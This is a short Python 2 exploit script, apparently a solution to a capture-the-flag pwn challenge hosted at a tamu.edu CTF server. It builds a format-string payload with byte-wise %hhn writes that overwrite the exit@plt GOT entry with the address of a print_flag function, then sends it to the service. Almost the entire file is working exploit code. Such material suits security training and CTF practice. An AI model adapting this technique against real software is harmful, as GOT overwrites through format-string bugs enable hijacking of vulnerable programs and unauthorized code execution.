import socket
import struct
import time
import telnetlib

def s(s):return sock.send(s)
def p(a):return struct.pack("<I",a)
def u(a):return struct.unpack("<I",a)[0]

def r(s):
	if type(s)==str:
		data=""
		while not data.endswith(s):
			data+=sock.recv(1)
		return data
	else:
		data=sock.recv(s)
		return data

def shell(sock):
	t=telnetlib.Telnet()
	t.sock=sock
	t.interact()
	sock.close()


HOST="pwn.ctf.tamu.edu"
PORT=4323

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

#080485ab <print_flag>:
# 08048450 <exit@plt>:
#  8048450:	ff 25 1c a0 04 08    	jmp    *0x804a01c
#  8048456:	68 20 00 00 00       	push   $0x20
#  804845b:	e9 a0 ff ff ff       	jmp    8048400 <_init+0x30>

print_flag_addr = 0x080485ab

BUF = ""
BUF += p(0x804a01c) #overwrite_addr
BUF += p(0x804a01d) #overwrite_addr+1
BUF += p(0x804a01e) #overwrite_addr+2
BUF += p(0x804a01f) #overwrite_addr+3

addr = [
	print_flag_addr >>  0 &0xff,
	print_flag_addr >>  8 &0xff,
	print_flag_addr >> 16 &0xff,
	print_flag_addr >> 24 &0xff,
]

BUF += "%%%dc%%4$hhn" %((addr[0]-len(BUF))&0xff)
BUF += "%%%dc%%5$hhn" %((addr[1]-addr[0])&0xff)
BUF += "%%%dc%%6$hhn" %((addr[2]-addr[1])&0xff)
BUF += "%%%dc%%7$hhn" %((addr[3]-addr[2])&0xff)
BUF += "\n"

s(BUF)
print r(1024)
